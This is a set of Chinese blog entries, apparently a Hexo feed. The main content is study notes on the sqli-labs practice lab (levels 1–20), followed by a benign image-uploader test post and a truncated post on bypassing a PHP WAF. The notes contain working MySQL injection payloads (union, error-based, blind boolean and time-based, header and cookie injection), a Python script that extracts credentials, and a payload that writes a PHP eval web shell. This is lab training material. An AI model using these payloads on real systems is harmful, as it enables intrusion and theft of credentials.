      <title>sqli-labs学习笔记Less11~20</title>
      <link href="/2019/10/06/sqli-labs-study-2/"/>
      <url>/2019/10/06/sqli-labs-study-2/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>sqli-labs,less11-20，相当于是1-20的post版本，并加了update和头注入</p><a id="more"></a><h2 id="Less11-12-POST-union注入"><a href="#Less11-12-POST-union注入" class="headerlink" title="Less11~12: POST union注入"></a>Less11~12: POST union注入</h2><p><strong>Less11</strong></p><p>普通，改成post了而已，username和password都能用</p><p><strong>Less12</strong></p><p><img src="https://i.loli.net/2019/10/11/ExQPJ56esCv4rRM.jpg" alt="image-20191009115746536"></p><p>闭合方式不同了而已</p><h2 id="Less13-14-POST-报错注入"><a href="#Less13-14-POST-报错注入" class="headerlink" title="Less13~14 POST 报错注入"></a>Less13~14 POST 报错注入</h2><p><strong>Less13</strong></p><p>username的闭合方式为：<code>username=(&#39;$username&#39;) and password = (&#39;$password&#39;)</code></p><p><code>admin&#39;) and 1=2#</code></p><img src="https://i.loli.net/2019/10/11/Z8iRg15ILnrOfUa.jpg" alt="image-20191009120350307" style="zoom:30%"><p><code>admin&#39;) and 1=1#</code></p><img src="https://i.loli.net/2019/10/11/njYFvEJ7dHQR9es.jpg" alt="image-20191009120317524" style="zoom:30%"><p><code>admind&#39;) and (select 1 from (select count(*),concat_ws(&quot;|&quot;,(select(select(select distinct concat_ws(&quot;:&quot;,username,password) from security.users limit 1,1))from information_schema.tables limit 0,1),floor(rand(0)*2))a from information_schema.tables group by a)x)#</code></p><p><strong>Less14</strong></p><p><code>admind&quot; and (select 1 from (select count(*),concat_ws(&quot;|&quot;,(select(select(select distinct concat_ws(&quot;:&quot;,username,password) from security.users limit 1,1))from information_schema.tables limit 0,1),floor(rand(0)*2))a from information_schema.tables group by a)x)#</code></p><h2 id="Less15-16-POST-布尔-时间注入复习"><a href="#Less15-16-POST-布尔-时间注入复习" class="headerlink" title="Less15~16: POST 布尔/时间注入复习"></a>Less15~16: POST 布尔/时间注入复习</h2><p>基本等同于Less8-10，没有特别要注意的</p><p>Less15是单引号；Less16是双引号</p><h2 id="Less17-update报错注入"><a href="#Less17-update报错注入" class="headerlink" title="Less17: update报错注入"></a>Less17: update报错注入</h2><p><strong>Less17</strong></p><p>password reset；基础逻辑应该是，find username 然后 update password</p><img src="https://i.loli.net/2019/10/11/r3X5ygawuB4CSPY.png" alt="Less17图" style="zoom:50%"><p>试了下admin，发现有hacker检测；password没有；password测试用”‘“闭合，不然就报错；所以update的报错注入吧</p><p>猜测应该后台逻辑：<code>update xxx set passwd=&#39;$passwd&#39; where uname=&quot;$uname&quot;</code></p><p>有意思的是，如果输入<code>admin&#39;#</code>，所有密码都变成admin，好好笑</p><p><code>xxxx&#39; and extractvalue(1,concat(0x7e,(select group_concat(concat_ws(&quot;:&quot;,id,username,password))from security.users)))-- +</code></p><p>Get Error: <strong>You can’t specify target table ‘users’ for update in FROM clause</strong></p><p>因为我本身就在更新users表，但是floor()报错可以行得通</p><p>看看源码：</p><figure class="highlight php"><figcaption><span>Less-17</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="comment">// truncation (see comments)</span></span><br><span class="line">                $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">                <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">                        &#123;</span><br><span class="line">                        $value = stripslashes($value);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Quote if not a number</span></span><br><span class="line">                <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">                        &#123;</span><br><span class="line">                        $value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                $value = intval($value);</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="Less18-20-http头部注入"><a href="#Less18-20-http头部注入" class="headerlink" title="Less18~20: http头部注入"></a>Less18~20: http头部注入</h2><p><strong>Less18</strong></p><p><img src="https://i.loli.net/2019/10/11/FjZiQnhUyEb9OPY.png" alt="Less18"></p><p>结果返回IP,User-Agent,看了源码，是直接insert到表了，而且User-Agent也没有做啥处理，所以，直接注入就好了；依然是报错注入；</p><p><strong>Less19</strong> referer注入</p><p>换成了referer头，其它没有变化；</p><p><strong>Less20</strong> cookie注入</p><p><img src="https://i.loli.net/2019/10/11/bKj5lI2yYZtAWHp.png" alt="cookie注入"></p><figure class="highlight php"><figcaption><span>Less-20/index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">大概<span class="number">121</span>行有这个：</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$result)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Issue with your mysql: '</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs学习笔记Less1~10</title>
      <link href="/2019/10/03/sqli-labs-study-1/"/>
      <url>/2019/10/03/sqli-labs-study-1/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>sqli-labs,一个很好的学习sql的集锦网站，try</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://blog.51cto.com/2042617/2338798" target="_blank" rel="noopener">https://blog.51cto.com/2042617/2338798</a></p><p>直接开始吧！</p><p>我装在docker里面，直接： <code>docker run -dt --name sqli-lab -p 80:80 --rm xxx</code></p><h2 id="Less1-4：union元数据"><a href="#Less1-4：union元数据" class="headerlink" title="Less1~4：union元数据"></a>Less1~4：union元数据</h2><p>比较普通的union查询注入，也没有什么waf，主要是闭合方式的不同</p><hr><p><strong>less1</strong></p><p>1’+order+by+3–+</p><p>1’+order+by+4–+</p><p>o’+union+select+1,@@version,3–+（用+代替空格，单纯–不行，用%23，也就是#的编码也可以）</p><p>o’+union+select+1,group_concat(schema_name),;%23</p><p>o’+union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema=’security’%23</p><p>o’+union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_name=’users’%23</p><p>o’+union+select+1,2,group_concat(concat_ws(“:”,id,username,password))from+security.users%23</p><hr><p><strong>less2</strong></p><p>基本无变化，同less1；数字型的</p><hr><p><strong>less3</strong></p><p>字符型注入,而且是以 (‘’)的方式闭合字符串的</p><p>999’)+union+select+1,group_concat(schema_name),3+from+information_schema.schemata%23</p><hr><p><strong>less4</strong></p><p><img src="https://i.loli.net/2019/10/09/tZVuJj3qTHShlGx.jpg" alt="观察闭合方式"></p><p>999”)+union+select+1,group_concat(schema_name),3+from+information_schema.schemata%23</p><hr><h2 id="Less5-6：报错"><a href="#Less5-6：报错" class="headerlink" title="Less5~6：报错"></a>Less5~6：报错</h2><p><strong>报错注入</strong></p><blockquote><p>count()+floor()+rand()报错注入</p></blockquote><p>参考：<a href="https://blog.csdn.net/cried_cat/article/details/80022378" target="_blank" rel="noopener">floor()函数报错分析</a></p><p>写得非常好，总结来说，就是与floor(rand(0)*2)拼接的字段作为group by的字段，导致插入键值key在虚表里插入产生冲突；从而导致错误</p><p>因此表最好是有三条数据以上这样才能保证产生冲突；</p><p>深入原理看参考</p><blockquote><p>updatexml(XML_document, XPath_string, new_value);</p></blockquote><p>xml文档更新</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>操纵第二个参数出错即可；比如<code>updatexml(1,concat(0x7e,(version())),0)</code>加一个<code>0x7e</code>(也就是~)导致解析出错</p><blockquote><p>extractvalue(XML_document，XPath_string)</p></blockquote><p>对XML文档进行查询的函数，基本同上</p><hr><p><strong>less5</strong></p><img src="https://i.loli.net/2019/10/09/1PYAgrDovnJVLj9.jpg" alt="关注闭合方式" style="zoom:50%"> <img src="https://i.loli.net/2019/10/09/cIFkxH3BzEGebsP.png" alt="and 1=1#" style="zoom:50%"> <img src="https://i.loli.net/2019/10/09/TGwyCMBUEi9WFoR.png" alt="and 1=2#" style="zoom:100%"><p>无回显，报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- floor报错</span></span><br><span class="line">and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">"|"</span>,(<span class="keyword">select</span>(<span class="keyword">select</span>(payload写这里！！))<span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)x)</span><br><span class="line"><span class="comment">-- 这个payload没有分隔符，小心点</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span>(<span class="keyword">select</span>(payload写这里！！))<span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这个payload不行</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">concat_ws</span>(<span class="string">":"</span>,<span class="keyword">id</span>,username,<span class="keyword">password</span>))<span class="keyword">from</span> security.users</span><br><span class="line"><span class="comment">-- 这个可以</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">concat_ws</span>(<span class="string">":"</span>,username,<span class="keyword">password</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆版本，最简单的，可以用来测试</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">","</span>,<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)x)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 以下两种：输出字符有长度限制，最长32位。</span></span><br><span class="line"><span class="comment">-- updatexml</span></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>, @@<span class="keyword">version</span>),<span class="number">0</span>)<span class="comment">--+</span></span><br><span class="line"><span class="keyword">and</span>+updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>+<span class="keyword">group_concat</span>(<span class="keyword">concat_ws</span>(<span class="string">":"</span>,<span class="keyword">id</span>,username,<span class="keyword">password</span>))+<span class="keyword">from</span>+security.users)),<span class="number">0</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--extravalue()</span></span><br><span class="line"><span class="keyword">and</span>+extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>+<span class="keyword">group_concat</span>(<span class="keyword">concat_ws</span>(<span class="string">":"</span>,<span class="keyword">id</span>,username,<span class="keyword">password</span>))+<span class="keyword">from</span>+security.users)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><hr><p><strong>less6</strong></p><p>和5差不多，只需要将?id=2’ 改为 ?id=2”即可</p><hr><h2 id="Less7：oufile-infile"><a href="#Less7：oufile-infile" class="headerlink" title="Less7：oufile/infile"></a>Less7：oufile/infile</h2><hr><p><strong>less7</strong></p><p>屏蔽了报错，出错就只返回SQL syntax</p><p>尝试是双括号闭合；尝试union select 1,2,3发现数据要三列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'))+union+select+1,2,"&lt;?php+@eval($_GET['</span>haha<span class="string">']);+?&gt;"+into+outfile+'</span>/<span class="keyword">var</span>/www/html/haha3.php<span class="string">';--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/09/PGCRjn2dHW8gQx9.jpg" alt="phpinfo()"></p><p>但是哦，这个要写权限，不然出错了，出错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 into outfile <span class="string">'/var/www/html/Less-1/haha.php'</span>;</span><br><span class="line">ERROR 1 (HY000): Can<span class="string">'t create/write to file '</span>/var/www/html/Less-1/haha.php<span class="string">' (Errcode: 13)</span></span><br></pre></td></tr></table></figure><hr><h2 id="Less8：boolian"><a href="#Less8：boolian" class="headerlink" title="Less8：boolian"></a>Less8：boolian</h2><p><strong>Less8</strong></p><p>就是闭合不一样，<code>id=4&#39;--+</code></p><p>出错没有反应；不出错返回”You are in…….”，本关说让你考虑下布尔注入。</p><p>sql基于布尔的盲注</p><p><img src="https://i.loli.net/2019/10/09/jN53vbt6fV2gXyU.png" alt="sql基于布尔的注入"></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://sqli-labs/Less-8/"</span></span><br><span class="line">id = <span class="string">"id="</span></span><br><span class="line">detect = <span class="string">"You are in..........."</span></span><br><span class="line"><span class="string">'''POC'''</span></span><br><span class="line">poc_database = <span class="string">"select group_concat(schema_name) from information_schema.schemata limit 0,1"</span></span><br><span class="line">poc_table = <span class="string">"select group_concat(table_name) from information_schema.tables where table_schema like 'security' limit 0,1"</span></span><br><span class="line">poc_column = <span class="string">"select group_concat(column_name) from information_schema.columns where table_name like 'users' and table_schema like 'security' limit 0,1"</span></span><br><span class="line">poc_data = <span class="string">"select group_concat(concat_ws('-',id,username,password)) from security.users where id &gt; 0 limit 0,1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toChar</span><span class="params">(results)</span>:</span></span><br><span class="line">    final = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(results)):</span><br><span class="line">        final += chr(results[i])</span><br><span class="line">    <span class="keyword">print</span> (final)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(sstr, l,r)</span>:</span></span><br><span class="line">    mjudge = int((l+r)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> (mjudge == l):</span><br><span class="line">        <span class="keyword">return</span> l</span><br><span class="line">    lparam = sstr</span><br><span class="line">    rparam = sstr</span><br><span class="line">    lparam = lparam.replace(<span class="string">"&lt;[symbol]&gt;"</span>, <span class="string">"&lt;"</span>)  <span class="comment">#</span></span><br><span class="line">    lparam = lparam.replace(<span class="string">"&lt;[jid]&gt;"</span>, str(mjudge))  <span class="comment">#</span></span><br><span class="line">    rparam = rparam.replace(<span class="string">"&lt;[symbol]&gt;"</span>,<span class="string">"&gt;="</span>)  <span class="comment">#</span></span><br><span class="line">    rparam = rparam.replace(<span class="string">"&lt;[jid]&gt;"</span>,str(mjudge))  <span class="comment">#</span></span><br><span class="line">    <span class="comment"># print (lparam,rparam)</span></span><br><span class="line">    lrsp = requests.get(url, params = lparam)</span><br><span class="line">    rrsp = requests.get(url, params = rparam)</span><br><span class="line">    <span class="comment"># print (lrsp.text.find(detect),rrsp.text.find(detect))</span></span><br><span class="line">    <span class="keyword">if</span> (lrsp.text.find(detect) &gt;= <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> judge(sstr,l,mjudge)</span><br><span class="line">    <span class="keyword">if</span> (rrsp.text.find(detect) &gt;= <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> judge(sstr,mjudge,r)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Wrong Occur: "</span>+str(l)+<span class="string">","</span>+str(r))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(poc)</span>:</span></span><br><span class="line">    flag = int(<span class="number">1e6</span>)</span><br><span class="line">    lx = <span class="number">0</span></span><br><span class="line">    results =[]</span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        lx += <span class="number">1</span></span><br><span class="line">        flag -= <span class="number">1</span></span><br><span class="line">        right = id + <span class="string">"1' and ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;0;%23"</span>.format(poc_database,lx)</span><br><span class="line">        response = requests.get(url, params=right)</span><br><span class="line">        <span class="keyword">if</span> ((response.text).find(detect) &lt; <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        sstr = id + <span class="string">"1' and ascii(substr((&#123;poc&#125;),&#123;lx&#125;,1))&lt;[symbol]&gt;&lt;[jid]&gt;;%23"</span>.format(poc=poc, lx=lx)</span><br><span class="line">        result = judge(sstr,<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">print</span> (chr(result), end=<span class="string">''</span>)</span><br><span class="line">        results.append(int(result))</span><br><span class="line"></span><br><span class="line">getData(poc_data)</span><br></pre></td></tr></table></figure><hr><h2 id="Less9-10-Time-based"><a href="#Less9-10-Time-based" class="headerlink" title="Less9~10: Time based"></a>Less9~10: Time based</h2><p><strong>Less9</strong></p><p>不管我输啥，页面返回都是一样的，我就不能用布尔注入了，没有对比</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1%27+and+sleep(0);%23</span><br><span class="line">id=1%27+and+sleep(4);%23</span><br><span class="line">两句话看出了差距</span><br></pre></td></tr></table></figure><p>时间注入，注意语句，把Less8的脚本改造一下就能用了，语句改成<code>1&#39; and if(ascii(substr(({POC}),{lx},1))&lt;[SYMBOL]&gt;&lt;[JID]&gt;,sleep({SLEEP_TIME}),1);%23</code></p><p>原理很简单，就是，慢…….的………要……..死………</p><p><strong>Less10</strong></p><p>变双引号就行</p><p><code>1&quot; and if(ascii(substr(({POC}),{lx},1))&lt;[SYMBOL]&gt;&lt;[JID]&gt;,sleep({SLEEP_TIME}),1);%23</code></p><p>当然除了sleep也可以用<code>(select benchmark(10000000,md5(0x41)))</code></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sm.ms图床测试及脚本测试</title>
      <link href="/2019/09/24/sm-ms/"/>
      <url>/2019/09/24/sm-ms/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>这是一个demo实例；自己写了一个sm.ms图床和typora的上传工具</p><p><a href="https://sm.ms" target="_blank" rel="noopener">https://sm.ms</a> 你值得拥有</p><a id="more"></a><p>其实iPic和很多sm.ms插件都可以，写这个主要是为了完美适配自己的需求吧，我的需求如下</p><ol><li><p>typora不单是写博客用，平时也经常用到，不想默认上传；</p></li><li><p>sm.ms图床的信息其实不太好收集，所以希望留下上传记录，包括hash和对应关系，方便删除</p></li><li><p>写的特别好的目前还没看到，就是包括操作，安装在内都比较漂亮的；我也在等待~</p></li></ol><h2 id="基础测试"><a href="#基础测试" class="headerlink" title="基础测试"></a>基础测试</h2><p>图片1：<code>&lt;img</code> 标签</p><img src="https://i.loli.net/2019/12/04/MgFAfsnjQYtkZLC.png" alt="image-20190924125401753" style="zoom:50%"><p>我用了很多用例，来测试我的程序稳定性</p><p>图片2：<code>&lt;img src = &#39;&#39;类型</code></p><img src="https://i.loli.net/2019/09/24/seqS4O7og8nUHMK.png" alt="image-20190924125505620" style="zoom:50%"><p>图片3：常见类型</p><p><img src="https://i.loli.net/2019/12/04/FLtx1Wg3hGMu26A.png" alt="摩天大厦"></p><p>图片4：网络图片类型</p><p><img src="https://avatar-static.segmentfault.com/231/346/2313469346-56d936a3aa49f_huge256" alt="头像"></p><h2 id="错误测试"><a href="#错误测试" class="headerlink" title="错误测试"></a>错误测试</h2><p>测试1：在代码中的应该被忽略，但是如果和使用的图片同名这个我就很尴尬，没处理好233333</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">![头像](https://avatar-static.segmentfault.com/231/346/2313469346-56d936a3aa49f_huge256)</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">'xxxxx.jpg'</span> <span class="attr">alt</span>=<span class="string">"images"</span> <span class="attr">style</span>=<span class="string">"zoom:50%;"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>并且对于<code>&lt;img src=&quot;xxxx&quot; /&gt;</code>这个没有处理好23333；考虑到\\`xxxx`这种情况还是蛮复杂的</p><p>你看它会解析到，但是由于找不到文件所以也没什么太大问题吧</p><p><img src="https://i.loli.net/2019/12/04/rpqfLubXH2y4B1s.png" alt="image-20190924131707140"></p><h2 id="结果表"><a href="#结果表" class="headerlink" title="结果表"></a>结果表</h2><p>一行一行算</p><img src="https://i.loli.net/2019/12/04/BItDwL54az3gOFH.png" alt="image-20190924131305167" style="zoom:100%"><p>单行数据表现如下；status表示已经在文档中处理完成了所有替换；</p><p><img src="https://i.loli.net/2019/12/04/Qxsbh48YgByioOt.png" alt="单行数据示例"></p><h2 id="后续添加"><a href="#后续添加" class="headerlink" title="后续添加"></a>后续添加</h2><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>关于key error导致程序停止</p><h3 id="参数处理"><a href="#参数处理" class="headerlink" title="参数处理"></a>参数处理</h3><p>关于如何更新token，更新recordFile</p><h3 id="图片压缩问题"><a href="#图片压缩问题" class="headerlink" title="图片压缩问题"></a>图片压缩问题</h3><p>图片压缩搞定啦，用的tinypng的接口，相当不错的，程序最后使用的wxpython图形化了，后续在放上来，也没有完全成型Orz</p><img src="https://i.loli.net/2019/12/06/wTzGat9o2eOdrHv.png" alt="压缩界面" style="zoom:50%"> <img src="https://i.loli.net/2019/12/06/jLyNIB1X9aG3PRE.png" alt="sm上传界面" style="zoom:50%"><p>END</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 工具指导 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 无参数函数执行</title>
      <link href="/2019/09/16/php-no-agruments/"/>
      <url>/2019/09/16/php-no-agruments/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>最近碰到了php无参数执行的题，看了觉得很有意思，mark一下</p><a id="more"></a><p>简单说一下：无参数执行这个为什么会产生；一般我们要是看见<code>eval(_GET[&#39;wtfk&#39;])</code>就可以参数执行啦，但是很有可能碰到这个waf:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $arg) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>划重点：<code>&#39;/[^\W]+\((?R)?\)/&#39;</code>等同于<code>&#39;/[a-z]+\((?R)?\)/&#39;</code></p><p>这是一个递归正则，就是无限嵌套无参函数；比如<code>a(b(c()))</code>这样就可以；<code>a(b(90))</code>就不行</p><h2 id="应对方法"><a href="#应对方法" class="headerlink" title="应对方法"></a>应对方法</h2><p>参考链接：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">PHP Parametric Function RCE</a></p><p>具体的我就不说太多了，参考链接里面写得非常好</p><p>罗列一下，大概是，获取变量的、获取随机数的、环境列表、操作数组的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getenv(void): <span class="keyword">array</span>; <span class="comment">// 全局变量</span></span><br><span class="line">array_flip(<span class="keyword">array</span> $array): <span class="keyword">array</span>; <span 